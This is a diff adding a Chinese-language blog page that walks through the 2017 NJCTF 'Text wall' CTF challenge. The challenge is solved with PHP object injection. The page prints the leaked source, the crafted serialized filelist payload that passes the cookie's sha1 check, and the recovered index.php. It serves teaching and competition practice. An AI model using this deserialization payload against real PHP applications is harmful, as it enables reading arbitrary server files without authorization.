@@ -1,0 +1,474 @@
+<!DOCTYPE html>
+
+
+  <html class="light page-post">
+
+
+<head>
+  <meta charset="utf-8">
+  
+  <title>NJCTF Text wall writeup | 可会知</title>
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  
+    <meta name="keywords" content="kovige,njctf,php," />
+  
+
+  <meta name="description" content="NJCTF Text wall writeup php反序列化题">
+<meta property="og:type" content="article">
+<meta property="og:title" content="NJCTF Text wall writeup">
+<meta property="og:url" content="https://kovige.github.io/2017/03/13/NJCTF text wall writeup/index.html">
+<meta property="og:site_name" content="可会知">
+<meta property="og:description" content="NJCTF Text wall writeup php反序列化题">
+<meta property="og:image" content="https://kovige.github.io/md2_images/obj.png">
+<meta property="og:image" content="https://kovige.github.io/./images/2017-03-13_125025.jpg">
+<meta property="og:image" content="https://kovige.github.io/./images/2017-03-13_130838.jpg">
+<meta property="og:image" content="https://kovige.github.io/./images/2017-03-13_123959.jpg">
+<meta property="og:updated_time" content="2017-03-13T06:09:08.985Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="NJCTF Text wall writeup">
+<meta name="twitter:description" content="NJCTF Text wall writeup php反序列化题">
+<meta name="twitter:image" content="https://kovige.github.io/md2_images/obj.png">
+
+  
+
+  
+    <link rel="icon" href="/tgl.ico">
+  
+
+  <link href="/css/styles.css?v=c114cbe6" rel="stylesheet">
+
+
+  
+    <link rel="stylesheet" href="/css/personal-style.css">
+  
+
+  
+
+  
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "//hm.baidu.com/hm.js?57e94d016e201fba3603a8a2b0263af0";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+  
+  <script type="text/javascript">
+	(function(){
+	    var bp = document.createElement('script');
+	    var curProtocol = window.location.protocol.split(':')[0];
+	    if (curProtocol === 'https') {
+	        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
+	    }
+	    else {
+	        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+	    }
+	    var s = document.getElementsByTagName("script")[0];
+	    s.parentNode.insertBefore(bp, s);
+	})();
+  </script>
+
+
+
+  
+    <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+  
+
+  
+    <link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.3.0/css/font-awesome.min.css">
+  
+</head>
+
+<body>
+
+
+  
+    <span id="toolbox-mobile" class="toolbox-mobile">盒子</span>
+  
+
+  <div class="post-header CENTER">
+   
+  <div class="toolbox">
+    <a class="toolbox-entry" href="/">
+      <span class="toolbox-entry-text">盒子</span>
+      <i class="icon-angle-down"></i>
+      <i class="icon-home"></i>
+    </a>
+    <ul class="list-toolbox">
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/archives/"
+            rel="noopener noreferrer"
+            target="_self"
+            >
+            博客
+          </a>
+        </li>
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/category/"
+            rel="noopener noreferrer"
+            target="_self"
+            >
+            分类
+          </a>
+        </li>
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/tag/"
+            rel="noopener noreferrer"
+            target="_self"
+            >
+            标签
+          </a>
+        </li>
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/link/"
+            rel="noopener noreferrer"
+            target="_self"
+            >
+            友链
+          </a>
+        </li>
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/about/"
+            rel="noopener noreferrer"
+            target="_self"
+            >
+            关于
+          </a>
+        </li>
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/atom.xml"
+            rel="noopener noreferrer"
+            target="_blank"
+            >
+            RSS
+          </a>
+        </li>
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/search/"
+            rel="noopener noreferrer"
+            target="_self"
+            >
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  </div>
+
+
+</div>
+
+
+  <div id="toc" class="toc-article">
+    <strong class="toc-title">Posts List</strong>
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00-思路"><span class="toc-text">0x00 思路</span></a></li></ol>
+  </div>
+
+
+
+<div class="content content-post CENTER">
+   <article id="post-NJCTF text wall writeup" class="article article-type-post" itemprop="blogPost">
+  <header class="article-header">
+    <h1 class="post-title">NJCTF Text wall writeup</h1>
+
+    <div class="article-meta">
+      <span>
+        <i class="icon-calendar"></i>
+        <span>2017.03.13</span>
+      </span>
+
+      
+
+      
+  <span class="article-category">
+    <i class="icon-list"></i>
+    <a class="article-category-link" href="/categories/ctf/">ctf</a>
+  </span>
+
+
+
+      
+        <span>
+          <i class="icon-comment"></i>
+          <a href="http://kovige.github.io/2017/03/13/NJCTF text wall writeup/#disqus_thread"></a>
+        </span>
+      
+
+      
+      <i class="fa fa-eye"></i> 
+        <span id="busuanzi_container_page_pv">
+           &nbsp热度 <span id="busuanzi_value_page_pv">
+           <i class="fa fa-spinner fa-spin"></i></span>℃
+        </span>
+      
+
+      
+      
+    </div>
+  </header>
+
+  <div class="article-content">
+    
+      <!-- 这里是文章头部的图片 大小为800px*200px左右-->
+<p><img src="https://kovige.github.io/md2_images/obj.png" alt=""><br><!-- 终于又有博客写了~ --></p>
+<p>NJCTF Text wall writeup php反序列化题</p>
+<a id="more"></a>
+<h2 id="0x00-思路"><a href="#0x00-思路" class="headerlink" title="0x00 思路"></a>0x00 思路</h2><p>输入<code>hiehiehie</code>点击submit之后，查看cookie，有一个list参数，其值为：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="number">24</span>c5889e00902d6bcc65073f0e91ea30bbe203c2a:<span class="number">1</span>:&#123;i:<span class="number">0</span>;s:<span class="number">9</span>:<span class="string">"hiehiehie"</span>;&#125;</div></pre></td></tr></table></figure>
+<p>前面这串看这像md5，于是将<code>a:1:{i:0;s:9:&quot;hiehiehie&quot;;}</code>加密，发现是sha1加密<br><img src="./images/2017-03-13_125025.jpg" alt="enter description here" title="2017-03-13_125025.jpg"><br>按照套路，这就是一道反序列化题，构造反序列化一般都需要源码，所以找到了源码泄露点：</p>
+<pre><code>http://218.2.197.235:23721/.index.php.swo
+</code></pre><p>长这个样子<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$lists = [];</div><div class="line"><span class="class"><span class="keyword">Class</span> <span class="title">filelist</span></span>&#123;</div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span></div><div class="line">    &#123;</div><div class="line">        <span class="keyword">return</span> highlight_file(<span class="string">'hiehiehie.txt'</span>, <span class="keyword">true</span>).highlight_file(<span class="keyword">$this</span>-&gt;source, <span class="keyword">true</span>);</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line">........</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
+<p>__toString()函数在echo一个对象时被调用<br>于是先自己构造一个filelist类的序列<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">Class</span> <span class="title">filelist</span></span>&#123;</div><div class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</div><div class="line"> 		<span class="keyword">$this</span>-&gt;source = <span class="string">'index.php'</span>;</div><div class="line"> 	&#125;</div><div class="line">	</div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span></div><div class="line">    &#123;</div><div class="line">        <span class="keyword">return</span> highlight_file(<span class="string">'hiehiehie.txt'</span>, <span class="keyword">true</span>).highlight_file(<span class="keyword">$this</span>-&gt;source, <span class="keyword">true</span>);</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line">$file = <span class="keyword">new</span> filelist();</div><div class="line">var_dump(serialize($file));</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
+<p>结果</p>
+<pre><code>string &apos;O:8:&quot;filelist&quot;:1:{s:6:&quot;source&quot;;s:9:&quot;index.php&quot;;}&apos; (length=48)
+</code></pre><p>放到cookie提交<br>出来个这<br><img src="./images/2017-03-13_130838.jpg" alt="enter description here" title="2017-03-13_130838.jpg"></p>
+<p>把index.php打印出来了，可见它的echo点就在index.php这个地方，而不是我们传过去的整个序列化字符串<br>那么，可以在一个类中将变量设定为filelist类<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">$lists = [];</div><div class="line"><span class="class"><span class="keyword">Class</span> <span class="title">a</span></span>&#123;</div><div class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</div><div class="line"> 		<span class="keyword">$this</span>-&gt;a = <span class="keyword">new</span> filelist();</div><div class="line"> 	&#125;</div><div class="line">	</div><div class="line">&#125;</div><div class="line"><span class="class"><span class="keyword">Class</span> <span class="title">filelist</span></span>&#123;</div><div class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</div><div class="line"> 		<span class="keyword">$this</span>-&gt;source = <span class="string">'index.php'</span>;</div><div class="line"> 	&#125;<span class="comment">//自己加了一个construct，给source赋值</span></div><div class="line">	</div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span></div><div class="line">    &#123;</div><div class="line">        <span class="keyword">return</span> highlight_file(<span class="string">'hiehiehie.txt'</span>, <span class="keyword">true</span>).highlight_file(<span class="keyword">$this</span>-&gt;source, <span class="keyword">true</span>);</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line">$file = <span class="keyword">new</span> a();</div><div class="line">var_dump(serialize($file));</div></pre></td></tr></table></figure></p>
+<p>类a是自己随便构造的，目的是想通过它echo变量a，而变量a又是filelist实例，这样，就能执行filelist的toString函数，就能将source变量指定文件的源码打印出来了<br>结果：</p>
+<pre><code>string &apos;O:1:&quot;a&quot;:1:{s:1:&quot;a&quot;;O:8:&quot;filelist&quot;:1:{s:6:&quot;source&quot;;s:9:&quot;index.php&quot;;}}&apos; (length=68)
+</code></pre><p>提交：</p>
+<pre><code>9f57a6efb19d4e418d5c4284ef002eb4e5eec13aO:1:&quot;a&quot;:1:{s:1:&quot;a&quot;;O:8:&quot;filelist&quot;:1:{s:6:&quot;source&quot;;s:9:&quot;index.php&quot;;}}
+</code></pre><p>得到index.php的源码<br><img src="./images/2017-03-13_123959.jpg" alt="enter description here" title="2017-03-13_123959.jpg"><br>看到了flag的地址，用相同方法可读取到flag。</p>
+<p>index.php:<br><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div></pre></td><td class="code"><pre><div class="line">//The flag is /var/www/PnK76P1IDfY5KrwsJrh1pL3c6XJ3fj7E_fl4g</div><div class="line">$lists = [];</div><div class="line">Class filelist&#123;</div><div class="line">    public function __toString()</div><div class="line">    &#123;</div><div class="line">        return highlight_file('hiehiehie.txt', true).highlight_file($this-&gt;source, true);</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line">if(isset($_COOKIE['lists']))&#123;</div><div class="line">    $cookie = $_COOKIE['lists'];</div><div class="line">    $hash = substr($cookie, 0, 40);</div><div class="line">    $sha1 = substr($cookie, 40);</div><div class="line">    if(sha1($sha1) === $hash)&#123;</div><div class="line">        $lists = unserialize($sha1);</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line">if(isset($_POST['hiehiehie']))&#123;</div><div class="line">    $info = $_POST['hiehiehie'];</div><div class="line">    $lists[] = $info;</div><div class="line">    $sha1 = serialize($lists);</div><div class="line">    $hash = sha1($sha1);</div><div class="line">    setcookie('lists', $hash.$sha1);</div><div class="line">    header('Location: '.$_SERVER['REQUEST_URI']);</div><div class="line">    exit;</div><div class="line">&#125;</div><div class="line">?&gt;</div><div class="line">&lt;!DOCTYPE html&gt;</div><div class="line">&lt;html&gt;</div><div class="line">&lt;head&gt;</div><div class="line">  &lt;title&gt;Please Get Flag!!&lt;/title&gt;</div><div class="line">  &lt;meta charset="utf-8"&gt;</div><div class="line">  &lt;meta name="viewport" content="width=device-width, initial-scale=1"&gt;</div><div class="line">  &lt;link rel="stylesheet" href="http://apps.bdimg.com/libs/bootstrap/3.3.0/css/bootstrap.min.css"&gt;  </div><div class="line">  &lt;script src="http://apps.bdimg.com/libs/jquery/2.1.1/jquery.min.js"&gt;&lt;/script&gt;</div><div class="line">  &lt;script src="http://apps.bdimg.com/libs/bootstrap/3.3.0/js/bootstrap.min.js"&gt;&lt;/script&gt;</div><div class="line">&lt;/head&gt;</div><div class="line">&lt;body&gt;</div><div class="line">&lt;div class="container"&gt;</div><div class="line">    &lt;div class="jumbotron"&gt;</div><div class="line">        &lt;h1&gt;Please Get Flag!!&lt;/h1&gt;</div><div class="line">    &lt;/div&gt;</div><div class="line">    &lt;div class="row"&gt;</div><div class="line">        &lt;?php foreach($lists as $info):?&gt;</div><div class="line">            &lt;div class="col-sm-4"&gt;</div><div class="line">              &lt;h3&gt;&lt;?=$info?&gt;&lt;/h3&gt;</div><div class="line">            &lt;/div&gt;</div><div class="line">        &lt;?php endforeach;?&gt;</div><div class="line">    &lt;/div&gt;</div><div class="line">    &lt;form method="post" href="."&gt;</div><div class="line">        &lt;input name="hiehiehie" value="hiehiehie"&gt;</div><div class="line">        &lt;input type="submit" value="submit"&gt;</div><div class="line">    &lt;/form&gt;</div><div class="line">&lt;/div&gt;</div><div class="line">&lt;/body&gt;</div><div class="line">&lt;html&gt;</div></pre></td></tr></table></figure></p>
+
+    
+  </div>
+</article>
+
+
+   
+  <div class="text-center donation">
+    <div class="inner-donation">
+      <span class="btn-donation">支持一下</span>
+      <div class="donation-body">
+        <div class="tip text-center">扫一扫，支持forsigner</div>
+        <ul class="theme.donation.items.length">
+        
+          <li class="item">
+            <img src="/images/qr-wechat.png" alt="">
+          </li>
+        
+          <li class="item">
+            <img src="/images/qr-alipay.png" alt="">
+          </li>
+        
+        </ul>
+      </div>
+    </div>
+  </div>
+
+
+   
+  <div class="box-prev-next clearfix">
+    <a class="show pull-left" href="/2017/02/07/websocket学习总结/">
+        <i class="icon icon-angle-left"></i>
+    </a>
+    <a class="hide pull-right" href="/">
+        <i class="icon icon-angle-right"></i>
+    </a>
+  </div>
+
+
+
+
+</div>
+
+
+  <a id="backTop" class="back-top">
+    <i class="icon-angle-up"></i>
+  </a>
+
+
+
+
+  <div class="modal" id="modal">
+  <span id="cover" class="cover hide"></span>
+  <div id="modal-dialog" class="modal-dialog hide-dialog">
+    <div class="modal-header">
+      <span id="close" class="btn-close">Close</span>
+    </div>
+    <hr>
+    <div class="modal-body">
+      <ul class="list-toolbox">
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/archives/"
+              rel="noopener noreferrer"
+              target="_self"
+              >
+              博客
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/category/"
+              rel="noopener noreferrer"
+              target="_self"
+              >
+              分类
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/tag/"
+              rel="noopener noreferrer"
+              target="_self"
+              >
+              标签
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/link/"
+              rel="noopener noreferrer"
+              target="_self"
+              >
+              友链
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/about/"
+              rel="noopener noreferrer"
+              target="_self"
+              >
+              关于
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/atom.xml"
+              rel="noopener noreferrer"
+              target="_blank"
+              >
+              RSS
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/search/"
+              rel="noopener noreferrer"
+              target="_self"
+              >
+              搜索
+            </a>
+          </li>
+        
+      </ul>
+
+    </div>
+  </div>
+</div>
+
+
+
+  
+      <div class="fexo-comments comments-post">
+    
+  <section class="disqus-comments">
+    <div id="disqus_thread">
+      <noscript>Please enable JavaScript to view the <a href="//disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+    </div>
+  </section>
+
+  <script>
+    var disqus_shortname = 'forsigner';
+    
+    var disqus_url = 'https://kovige.github.io/2017/03/13/NJCTF text wall writeup/';
+    
+    (function(){
+      var dsq = document.createElement('script');
+      dsq.type = 'text/javascript';
+      dsq.async = true;
+      dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+  </script>
+
+  <script id="dsq-count-scr" src="//forsigner.disqus.com/count.js" async></script>
+
+
+
+    
+
+
+
+
+    
+
+  </div>
+
+  
+
+  <script type="text/javascript">
+  function loadScript(url, callback) {
+    var script = document.createElement('script')
+    script.type = 'text/javascript';
+
+    if (script.readyState) { //IE
+      script.onreadystatechange = function() {
+        if (script.readyState == 'loaded' ||
+          script.readyState == 'complete') {
+          script.onreadystatechange = null;
+          callback();
+        }
+      };
+    } else { //Others
+      script.onload = function() {
+        callback();
+      };
+    }
+
+    script.src = url;
+    document.getElementsByTagName('head')[0].appendChild(script);
+  }
+
+  window.onload = function() {
+    loadScript('/js/bundle.js?235683', function() {
+      // load success
+    });
+  }
+</script>
+
+</body>
+</html>
